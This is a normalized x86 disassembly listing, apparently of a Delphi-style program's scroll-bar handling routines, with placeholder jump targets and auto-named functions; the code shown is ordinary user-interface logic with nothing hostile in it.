mov eax [ ebp - 0x8 ]
call sub_454874
jmp r-xdata
inc ebx
xor esi esi
push ebp
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
mov edx esi
call sub_4403fc
call sub_4540d8
pop ecx
push ebp
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
mov edx esi
call sub_4403fc
call sub_45406c
pop ecx
jmp r-xdata
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x18 ] 0x0
jne r-xdata
inc esi
dec ebx
jne r-xdata
sub_4541ec
push ebx
push esi
mov ebx eax
mov esi 0x100000
cmp [ ebx + 0x18 ] 0x1
jne r-xdata
cmp [ ebx + 0x1c ] 0x0
je r-xdata
mov esi 0x200000
xor eax eax
pop esi
pop ebx
retn
push 0xfffffff0
mov eax [ ebx + 0x4 ]
call sub_443708
push eax
call GetWindowLongA
test eax esi
jne r-xdata
mov al 0x1
pop esi
pop ebx
retn
sub_454224
push ebp
mov ebp esp
push ebx
mov ebx 0x100000
cmp ax 0x1
jne r-xdata
push 0xfffffff0
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x4 ]
call sub_443708
push eax
call GetWindowLongA
test eax ebx
setne al
pop ebx
pop ebp
retn
mov ebx 0x200000
sub_454258
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi edx
mov esi eax
xor ebx ebx
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x5 ] 0x0
jne r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
pop ebp
retn
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x6 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x6 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax esi
call sub_454224
pop ecx
test al al
jne r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax esi
call sub_454224
pop ecx
test al al
je r-xdata
movzx eax di
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov ebx eax
mov eax [ ebp + 0x8 ]
sub ebx [ eax - 0xc ]
neg ebx
jmp r-xdata
movzx eax di
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov ebx eax
mov eax [ ebp + 0x8 ]
sub ebx [ eax - 0xc ]
sub_4542d4
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
mov [ ebp - 0x6 ] cl
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
push 0xfffffff0
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
call sub_443708
push eax
call GetWindowLongA
test eax 0x840000
setne al
and eax 0x7f
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x18 ] 0x1
jne r-xdata
push ebp
mov dx 0x14
mov ax 0x1
call sub_454258
pop ecx
mov ebx eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
call sub_43c924
add ebx eax
mov eax ebx
push ebp
mov dx 0x15
xor eax eax
call sub_454258
pop ecx
mov ebx eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
call sub_43c968
add ebx eax
mov eax ebx
jmp r-xdata
pop ebx
mov esp ebp
pop ebp
retn
sub_45436c
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
push esi
mov [ ebp - 0x1c ] 0x1c
mov [ ebp - 0x18 ] 0x10
xor ebx ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp [ eax + 0x18 ] 0x1
jne r-xdata
mov eax [ ebp + 0x8 ]
mov esi [ eax - 0x8 ]
movsx esi [ esi + 0x6 ]
lea eax [ ebp - 0x1c ]
push eax
push ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x4 ]
call sub_443708
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
test eax eax
je r-xdata
mov ebx 0x1
mov eax esi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov esi [ ebp - 0x4 ]
sub_4543cc
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x1f ] 0x0
je r-xdata
mov eax [ ebp - 0x8 ]
movsx eax [ eax + 0x4 ]
cmp eax 0x7
ja r-xdata
mov eax [ ebp - 0x8 ]
mov ax [ eax + 0x4 ]
sub ax 0x4
jae r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
jmp [ eax * 4 + jump_table_45459d ]
mov eax [ ebp - 0x8 ]
mov ax [ eax + 0x4 ]
sub ax 0x2
jb r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0xc ]
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x8 ]
sub edx eax
mov eax [ ebp - 0x4 ]
call sub_45473c
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0xc ]
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x8 ]
add edx eax
mov eax [ ebp - 0x4 ]
call sub_45473c
jmp r-xdata
xor ecx ecx
mov dl 0x1
mov eax [ ebp - 0x4 ]
call sub_4542d4
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0xc ]
sub edx eax
mov eax [ ebp - 0x4 ]
call sub_45473c
jmp r-xdata
xor ecx ecx
mov dl 0x1
mov eax [ ebp - 0x4 ]
call sub_4542d4
mov edx eax
mov eax [ ebp - 0x4 ]
add edx [ eax + 0xc ]
mov eax [ ebp - 0x4 ]
call sub_45473c
jmp r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x14 ] 0x7fff
jle r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x1d ] 0x0
je r-xdata
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_45473c
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x14 ]
mov eax [ ebp - 0x4 ]
call sub_45473c
mov eax [ ebp - 0x4 ]
movzx ebx [ eax + 0x8 ]
mov eax ebx
mov edx [ ebp - 0x4 ]
mov ecx [ edx + 0x40 ]
cdq
idiv ecx
mov [ ebp - 0xc ] eax
mov eax ebx
cdq
idiv ecx
mov [ ebp - 0x10 ] edx
mov esi ecx
jmp r-xdata
sub ax 0x2
jb r-xdata
mov edx [ ebp - 0x8 ]
movsx edx [ edx + 0x6 ]
mov eax [ ebp - 0x4 ]
call sub_45473c
jmp r-xdata
push ebp
call sub_45436c
pop ecx
mov edx eax
mov eax [ ebp - 0x4 ]
call sub_45473c
jmp r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x14 ] 0x7fff
jle r-xdata
xor edi edi
test esi esi
jle r-xdata
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0xa ]
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x3c ]
mov eax [ ebp - 0xc ]
cdq
idiv ecx
mov [ ebp - 0x10 ] edx
mov eax [ ebp - 0xc ]
cdq
idiv ecx
mov [ ebp - 0xc ] eax
mov esi ecx
jmp r-xdata
jmp r-xdata
mov edx [ ebp - 0x8 ]
movsx edx [ edx + 0x6 ]
mov eax [ ebp - 0x4 ]
call sub_45473c
jmp r-xdata
push ebp
call sub_45436c
pop ecx
mov edx eax
mov eax [ ebp - 0x4 ]
call sub_45473c
jmp r-xdata
cmp [ ebp - 0x10 ] 0x0
jle r-xdata
call sub_4069a4
mov ebx eax
mov eax ebx
sub eax edi
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x20 ]
cmp eax edx
jge r-xdata
xor esi esi
xor eax eax
mov [ ebp - 0xc ] eax
xor eax eax
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x8 ]
mov ax [ eax + 0x4 ]
sub ax 0x1
jb r-xdata
mov edi ebx
mov eax [ ebp - 0x8 ]
mov ax [ eax + 0x4 ]
sub ax 0x1
jb r-xdata
sub edx eax
push edx
call Sleep
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0xc ]
sub edx [ ebp - 0x10 ]
mov eax [ ebp - 0x4 ]
call sub_45473c
jmp r-xdata
je r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0xc ]
sub edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
call sub_45473c
jmp r-xdata
je r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0xc ]
add edx [ ebp - 0x10 ]
mov eax [ ebp - 0x4 ]
call sub_45473c
jmp r-xdata
dec ax
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov edx [ eax ]
call [ edx + 0x88 ]
dec esi
test esi esi
jg r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0xc ]
add edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
call sub_45473c
jmp r-xdata
dec ax
je r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0xc ]
sub edx [ ebp - 0x10 ]
mov eax [ ebp - 0x4 ]
call sub_45473c
jmp r-xdata
dec ax
je r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0xc ]
sub edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
call sub_45473c
jmp r-xdata
dec ax
je r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0xc ]
add edx [ ebp - 0x10 ]
mov eax [ ebp - 0x4 ]
call sub_45473c
jmp r-xdata
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0xc ]
add edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
call sub_45473c
jmp r-xdata
sub_4546c4
push ebx
push esi
mov ebx eax
cmp edx [ ebx + 0x24 ]
je r-xdata
pop esi
pop ebx
retn
mov esi edx
test esi esi
jne r-xdata
mov [ ebx + 0x24 ] edx
mov [ ebx + 0x44 ] 0x1
mov eax [ ebx + 0x4 ]
call sub_454db4
test esi esi
jne r-xdata
xor eax eax
mov al [ ebx + 0x18 ]
mov eax [ eax * 4 + rw-data ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov edx eax
xor eax eax
mov [ ebx + 0x24 ] eax
sub_45473c
push ebx
push esi
push edi
mov ebx eax
mov eax [ ebx + 0x4 ]
test [ eax + 0x1c ] 0x2
je r-xdata
mov eax [ ebx + 0x14 ]
cmp edx eax
jle r-xdata
mov [ ebx + 0xc ] edx
jmp r-xdata
test edx edx
jge r-xdata
mov edx eax
jmp r-xdata
pop edi
pop esi
pop ebx
retn
cmp [ ebx + 0x18 ] 0x0
jne r-xdata
xor edx edx
mov si 0x1
xor esi esi
jmp r-xdata
movzx edi si
push edi
mov eax [ ebx + 0x4 ]
call sub_443708
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
cmp eax [ ebx + 0xc ]
je r-xdata
mov [ ebx + 0xc ] edx
cmp [ ebx + 0x18 ] 0x0
jne r-xdata
mov eax [ ebx + 0xc ]
cmp edx eax
je r-xdata
push 0xffffffff
mov eax [ ebx + 0xc ]
push eax
push edi
mov eax [ ebx + 0x4 ]
call sub_443708
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov ecx eax
sub ecx edx
mov eax [ ebx + 0x4 ]
xor edx edx
call sub_4432c0
sub eax edx
mov edx eax
xor ecx ecx
mov eax [ ebx + 0x4 ]
call sub_4432c0
jmp r-xdata
call sub_453eac
test eax eax
je r-xdata
mov eax [ ebx + 0x4 ]
test [ eax + 0x1c ] 0x10
je r-xdata
cmp [ eax + 0x250 ] 0x0
je r-xdata
mov eax [ eax + 0x250 ]
mov edx [ eax ]
call [ edx + 0xc ]
sub_454800
push ebx
push esi
mov ebx eax
cmp edx [ ebx + 0x30 ]
je r-xdata
pop esi
pop ebx
retn
mov esi edx
test esi esi
jne r-xdata
mov [ ebx + 0x30 ] edx
mov [ ebx + 0x44 ] 0x1
mov eax [ ebx + 0x4 ]
call sub_454db4
test esi esi
jne r-xdata
xor eax eax
mov al [ ebx + 0x18 ]
mov eax [ eax * 4 + rw-data ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov edx eax
xor eax eax
mov [ ebx + 0x30 ] eax
sub_4548b8
push ebp
mov ebp esp
push ebx
push esi
mov ebx eax
mov esi [ ebp + 0x8 ]
add esi 0xfffffffc
cmp bl 0x1
cmc
sbb eax eax
push eax
mov eax [ esi ]
movzx eax [ eax + 0x34 ]
mov eax [ eax * 4 + rw-data ]
push eax
mov eax [ esi ]
movzx eax [ eax + 0x18 ]
lea eax [ eax + eax * 4 ]
mov eax [ eax * 4 + rw-data ]
push eax
mov eax [ esi ]
mov eax [ eax + 0x4 ]
call sub_443708
push eax
call sub_425ed0
mov eax [ esi ]
cmp [ eax + 0x24 ] 0x0
jle r-xdata
mov eax [ esi ]
cmp [ eax + 0x38 ] 0x0
jle r-xdata
push 0x0
mov eax [ esi ]
mov eax [ eax + 0x24 ]
push eax
mov eax [ esi ]
movzx eax [ eax + 0x18 ]
lea eax [ eax + eax * 4 ]
mov eax [ eax * 4 + rw-data ]
push eax
mov eax [ esi ]
mov eax [ eax + 0x4 ]
call sub_443708
push eax
call sub_425ed0
mov eax [ esi ]
cmp [ eax + 0x30 ] 0x0
jle r-xdata
push 0x0
mov eax [ esi ]
mov eax [ eax + 0x38 ]
push eax
mov eax [ esi ]
movzx eax [ eax + 0x18 ]
lea eax [ eax + eax * 4 ]
mov eax [ eax * 4 + rw-data ]
push eax
mov eax [ esi ]
mov eax [ eax + 0x4 ]
call sub_443708
push eax
call sub_425ed0
push 0x0
mov eax [ esi ]
mov eax [ eax + 0x28 ]
call sub_41c958
push eax
mov eax [ esi ]
movzx eax [ eax + 0x18 ]
lea eax [ eax + eax * 4 ]
mov eax [ eax * 4 + rw-data ]
push eax
mov eax [ esi ]
mov eax [ eax + 0x4 ]
call sub_443708
push eax
call sub_425ed0
pop esi
pop ebx
pop ebp
retn
push 0x0
mov eax [ esi ]
mov eax [ eax + 0x30 ]
push eax
mov eax [ esi ]
movzx eax [ eax + 0x18 ]
lea eax [ eax + eax * 4 ]
mov eax [ eax * 4 + rw-data ]
push eax
mov eax [ esi ]
mov eax [ eax + 0x4 ]
call sub_443708
push eax
call sub_425ed0
sub_4549c0
push ebp
mov ebp esp
add esp 0xffffffdc
push ebx
push esi
push edi
mov [ ebp - 0x6 ] cl
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
lea esi [ ebp - 0x4 ]
mov eax [ esi ]
xor edx edx
mov [ eax + 0x14 ] edx
xor ebx ebx
mov eax [ esi ]
cmp [ eax + 0x18 ] 0x1
jne r-xdata
mov eax [ esi ]
cmp [ eax + 0x1c ] 0x0
je r-xdata
mov bx 0x1
mov [ ebp - 0x22 ] 0x1c
mov [ ebp - 0x1e ] 0x17
xor eax eax
mov [ ebp - 0x1a ] eax
mov eax [ esi ]
cmp [ eax + 0x14 ] 0x0
jle r-xdata
mov cl [ ebp - 0x6 ]
mov dl [ ebp - 0x5 ]
mov eax [ esi ]
call sub_4542d4
mov edx [ esi ]
mov edi [ edx + 0x10 ]
sub edi eax
mov eax [ esi ]
mov [ eax + 0x14 ] edi
test edi edi
jge r-xdata
xor eax eax
mov [ ebp - 0x16 ] eax
mov eax [ esi ]
mov eax [ eax + 0x10 ]
mov [ ebp - 0x16 ] eax
jmp r-xdata
mov eax [ esi ]
xor edx edx
mov [ eax + 0x14 ] edx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
movzx eax bx
mov ecx 0xa
xor edx edx
div ecx
mov edx [ esi ]
mov [ edx + 0x8 ] ax
mov cl [ ebp - 0x6 ]
mov dl [ ebp - 0x5 ]
mov eax [ esi ]
call sub_4542d4
inc eax
mov [ ebp - 0x12 ] eax
mov eax [ esi ]
mov eax [ eax + 0xc ]
mov [ ebp - 0xe ] eax
mov [ ebp - 0xa ] eax
push ebp
mov eax [ esi ]
mov al [ eax + 0x44 ]
call sub_4548b8
pop ecx
mov eax [ esi ]
mov [ eax + 0x44 ] 0x0
push 0xffffffff
lea eax [ ebp - 0x22 ]
push eax
movzx eax bx
push eax
mov eax [ esi ]
mov eax [ eax + 0x4 ]
call sub_443708
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov eax [ esi ]
mov edx [ eax + 0xc ]
mov eax [ esi ]
call sub_45473c
xor ecx ecx
mov dl 0x1
mov eax [ esi ]
call sub_4542d4
lea eax [ eax + eax * 8 ]
mov ecx 0xa
cdq
idiv ecx
mov ebx eax
mov eax [ esi ]
mov [ eax + 0xa ] bx
mov eax [ esi ]
cmp [ eax + 0x1f ] 0x0
je r-xdata
sub_454ad8
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_43f434
mov eax [ esi + 0x50 ]
or eax [ r-xdata ]
mov [ esi + 0x50 ] eax
push 0x0
mov ecx esi
mov dl 0x1
mov eax [ r-xdata ]
call sub_453f54
mov [ esi + 0x208 ] eax
push 0x1
mov ecx esi
mov dl 0x1
mov eax [ r-xdata ]
call sub_453f54
mov [ esi + 0x20c ] eax
mov [ esi + 0x210 ] 0x1
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_40357c
mov eax esi
pop esi
pop ebx
retn
call sub_4035d4
pop [ fs : 0x0 ]
add esp 0xc
sub_454b50
push ebx
push esi
call sub_4035e4
mov ebx edx
mov esi eax
mov eax [ esi + 0x208 ]
call sub_403258
mov eax [ esi + 0x20c ]
call sub_403258
mov edx ebx
and dl 0xfc
mov eax esi
call sub_43f558
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4035cc
sub_454b9c
push ebx
mov ebx eax
mov eax ebx
call sub_4406c0
mov eax [ rw-data ]
cmp [ eax + 0xd ] 0x0
jne r-xdata
mov eax ebx
call sub_454db4
pop ebx
retn
mov edx 0x1
mov eax 0x5
call sub_40bf28
test al al
jne r-xdata
mov eax ebx
call sub_443708
push eax
call sub_425f04
sub_454bdc
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax ebx
call sub_454d34
mov ecx edi
mov edx esi
mov eax ebx
call sub_43fe08
pop edi
pop esi
pop ebx
retn
sub_454c1c
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_403228
mov [ ebp - 0x10 ] eax
xor eax eax
push ebp
push sub_454d24
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_43c924
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x208 ]
mov eax ebx
call sub_4541ec
test al al
je r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebx + 0x10 ]
cmp eax [ ebp - 0x8 ]
jg r-xdata
mov [ ebp - 0x9 ] al
cmp [ ebp - 0x9 ] 0x0
je r-xdata
mov al 0x1
mov eax [ ebp - 0x4 ]
call sub_440438
mov esi eax
dec esi
test esi esi
jl r-xdata
mov eax [ ebx + 0x10 ]
mov [ ebp - 0x8 ] eax
xor edx edx
mov eax ebx
call sub_45473c
mov eax [ ebp - 0x10 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
inc esi
xor ebx ebx
cmp [ ebp - 0x9 ] 0x0
je r-xdata
inc esi
xor ebx ebx
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_4403fc
mov edi eax
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_4403fc
mov edx eax
mov eax [ ebp - 0x10 ]
call sub_413de8
mov edx [ ebp - 0x8 ]
sub edx [ edi + 0x48 ]
sub edx [ edi + 0x40 ]
mov eax edi
call sub_43c690
inc ebx
dec esi
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_454d2b
mov eax [ ebp - 0x10 ]
call sub_403258
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
call sub_454034
push 0x0
mov edx ebx
mov eax [ ebp - 0x10 ]
call sub_413f44
xor ecx ecx
mov edx 0xb03e
call sub_43e0d4
inc ebx
dec esi
jne r-xdata
sub_454d58
push ebx
mov ebx eax
cmp dl [ ebx + 0x210 ]
je r-xdata
pop ebx
retn
mov [ ebx + 0x210 ] dl
test dl dl
je r-xdata
xor edx edx
mov eax [ ebx + 0x208 ]
call sub_45488c
xor edx edx
mov eax [ ebx + 0x20c ]
call sub_45488c
mov eax ebx
call sub_454d34
jmp r-xdata
sub_454db4
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x218 ] 0x0
jne r-xdata
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
call sub_443a0c
test al al
je r-xdata
xor eax eax
push ebp
push sub_454e9f
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov [ eax + 0x218 ] 0x1
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x20c ]
call sub_454354
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
call sub_454354
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
mov cl 0x1
xor edx edx
call sub_4549c0
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x20c ]
xor ecx ecx
mov dl 0x1
call sub_4549c0
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x20c ]
xor ecx ecx
xor edx edx
call sub_4549c0
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
xor ecx ecx
mov dl 0x1
call sub_4549c0
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x20c ]
mov cl 0x1
xor edx edx
call sub_4549c0
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
xor ecx ecx
mov dl 0x1
call sub_4549c0
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x218 ] 0x0
retn
sub_454ec4
push ebx
push esi
push edi
push ebp
add esp 0xffffffe0
mov esi edx
mov ebx eax
mov edi esp
test esi esi
je r-xdata
add esp 0x20
pop ebp
pop edi
pop esi
pop ebx
retn
mov edx edi
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x44 ]
mov eax [ ebx + 0x208 ]
movzx eax [ eax + 0x1a ]
sub [ edi ] eax
add [ edi + 0x8 ] eax
mov eax [ ebx + 0x20c ]
movzx eax [ eax + 0x1a ]
sub [ edi + 0x4 ] eax
add [ edi + 0xc ] eax
lea ecx [ esp + 0x18 ]
mov edx edi
mov eax esi
call sub_43ca38
lea edx [ esp + 0x18 ]
lea ecx [ esp + 0x10 ]
mov eax ebx
call sub_43ca64
mov eax [ esp + 0x10 ]
mov [ edi ] eax
mov eax [ esp + 0x14 ]
mov [ edi + 0x4 ] eax
lea ecx [ esp + 0x18 ]
lea edx [ edi + 0x8 ]
mov eax esi
call sub_43ca38
lea edx [ esp + 0x18 ]
lea ecx [ esp + 0x10 ]
mov eax ebx
call sub_43ca64
mov eax [ esp + 0x10 ]
mov [ edi + 0x8 ] eax
mov eax [ esp + 0x14 ]
mov [ edi + 0xc ] eax
mov esi [ edi ]
test esi esi
jge r-xdata
mov eax ebx
call sub_43c924
mov ebp [ edi + 0x8 ]
cmp eax ebp
jge r-xdata
mov eax [ ebx + 0x208 ]
mov edx [ eax + 0xc ]
add edx esi
call sub_45473c
jmp r-xdata
mov esi [ edi + 0x4 ]
test esi esi
jge r-xdata
mov eax ebx
call sub_43c924
sub ebp esi
cmp eax ebp
jge r-xdata
mov eax ebx
call sub_43c968
mov ebp [ edi + 0xc ]
cmp eax ebp
jge r-xdata
mov eax [ ebx + 0x20c ]
mov edx [ eax + 0xc ]
add edx esi
call sub_45473c
jmp r-xdata
mov esi [ ebx + 0x208 ]
mov eax ebx
call sub_43c924
mov edx [ esi + 0xc ]
add edx [ edi + 0x8 ]
sub edx eax
mov eax esi
call sub_45473c
mov eax ebx
call sub_43c924
add eax [ edi ]
mov [ edi + 0x8 ] eax
mov eax ebx
call sub_43c968
sub ebp esi
cmp eax ebp
jge r-xdata
mov esi [ ebx + 0x20c ]
mov eax ebx
call sub_43c968
mov edx [ esi + 0xc ]
add edx [ edi + 0xc ]
sub edx eax
mov eax esi
call sub_45473c
mov eax ebx
call sub_43c968
add eax [ edi + 0x4 ]
mov [ edi + 0xc ] eax
sub_455018
push ebx
push esi
push edi
push ebp
mov edi ecx
mov esi edx
mov ebx eax
cmp edi esi
je r-xdata
mov eax [ ebx + 0x208 ]
mov [ eax + 0x1e ] 0x0
mov eax [ ebx + 0x20c ]
mov [ eax + 0x1e ] 0x0
pop ebp
pop edi
pop esi
pop ebx
retn
test [ ebx + 0x1c ] 0x1
jne r-xdata
xor edx edx
mov eax [ ebx + 0x208 ]
call sub_45473c
xor edx edx
mov eax [ ebx + 0x20c ]
call sub_45473c
cmp [ ebx + 0x210 ] 0x0
jne r-xdata
mov eax [ ebx + 0x208 ]
mov [ eax + 0x1e ] 0x1
mov eax [ ebx + 0x20c ]
mov [ eax + 0x1e ] 0x1
mov ebp [ ebx + 0x208 ]
cmp [ ebp + 0x1e ] 0x0
je r-xdata
mov ebp [ ebx + 0x20c ]
cmp [ ebp + 0x1e ] 0x0
je r-xdata
push edi
push esi
mov eax [ ebp + 0x10 ]
push eax
call MulDiv
mov edx eax
mov eax ebp
call sub_45488c
push edi
push esi
mov eax [ ebp + 0x10 ]
push eax
call MulDiv
mov edx eax
mov eax ebp
call sub_45488c
sub_4550bc
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov ecx edi
mov edx esi
mov eax ebx
call sub_455018
mov ecx edi
mov edx esi
mov eax ebx
call sub_443214
pop edi
pop esi
pop ebx
retn
sub_4550e4
push ebp
mov ebp esp
push ecx
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
inc [ eax + 0x214 ]
xor edx edx
push ebp
push sub_45514e
push [ fs : edx ]
mov [ fs : edx ] esp
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_441cf4
xor eax eax
mov edx [ ebx + 0x4 ]
sub edx 0x1
jb r-xdata
xor eax eax
jmp r-xdata
je r-xdata
mov edx eax
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0xd0 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_455155
mov eax [ ebp - 0x4 ]
dec [ eax + 0x214 ]
retn
mov al 0x1
jmp r-xdata
dec edx
je r-xdata
mov al 0x2
jmp r-xdata
sub_455155
mov eax [ ebp - 0x4 ]
mov [ eax + 0x218 ] 0x1
xor eax eax
push ebp
push sub_45518d
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_454d34
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_455194
mov eax [ ebp - 0x4 ]
mov [ eax + 0x218 ] 0x0
retn
sub_455194
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
cmp [ eax + 0x1c ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
call sub_454db4
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x20c ]
cmp [ eax + 0x1c ] 0x0
je r-xdata
pop ebx
pop ecx
pop ebp
retn
sub_455208
push ebx
push esi
push edi
add esp 0xfffffff0
mov esi edx
mov ebx eax
mov eax ebx
call sub_43c968
mov edx [ ebx + 0x20c ]
mov edx [ edx + 0x10 ]
call sub_4242a8
push eax
lea eax [ esp + 0x4 ]
push eax
mov eax ebx
call sub_43c924
mov edx eax
mov edi [ ebx + 0x208 ]
mov eax [ edi + 0x10 ]
call sub_4242a8
mov ecx eax
mov eax [ ebx + 0x20c ]
mov edx [ eax + 0xc ]
neg edx
mov eax [ edi + 0xc ]
neg eax
call sub_412b38
push esi
mov edi esi
lea esi [ esp + 0x4 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop esi
mov edx esi
mov eax ebx
call sub_43f774
add esp 0x10
pop edi
pop esi
pop ebx
retn
sub_455278
push ebp
mov ebp esp
add esp 0xfffffff4
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_4552d9
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov edx [ rw-data ]
call sub_4033e4
test al al
jne r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_442a84
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4552e0
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0xc ]
mov [ eax + 0x4 ] edx
retn
mov eax [ ebp - 0x8 ]
mov [ eax + 0x4 ] 0x1
sub_455308
push ebp
mov ebp esp
add esp 0xfffffeec
push ebx
xor ebx ebx
mov [ ebp - 0x114 ] ebx
test dl dl
je r-xdata
mov ebx ecx
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_45546c
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ eax ]
call [ edx + 0x14 ]
xor eax eax
push ebp
push sub_45544c
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x0
